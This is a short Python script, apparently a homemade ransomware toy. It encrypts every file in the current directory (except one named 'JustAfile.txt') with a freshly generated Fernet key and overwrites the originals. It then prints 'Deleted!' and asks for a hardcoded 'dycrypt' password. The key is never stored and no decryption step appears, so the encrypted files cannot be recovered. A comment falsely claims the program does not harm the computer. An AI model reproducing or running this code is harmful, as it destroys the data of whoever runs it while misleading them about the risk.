import os
import time
from os import system
from cryptography.fernet import Fernet
from platform import platform

# delete
puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]

if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'


# Used to encrypt this program (does not harm ur computer...

files = []

for file in os.listdir():
	if file == "JustAfile.txt":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

# Creating a encrpytionkey that will be used to lock the found files
secretkey = Fernet.generate_key()

# Going through the files list and encrpying everything
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(secretkey).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
   
os.system(delet)
print("Deleted!")   

time.sleep(5)
# LITERALY THE FUCKING PASSWORD
password = "dycrypt"

os.system(delet)
print("Orbit <-0->")
print("Type ur 'dycrypt' password.")
time.sleep(5)
print("Type password:")
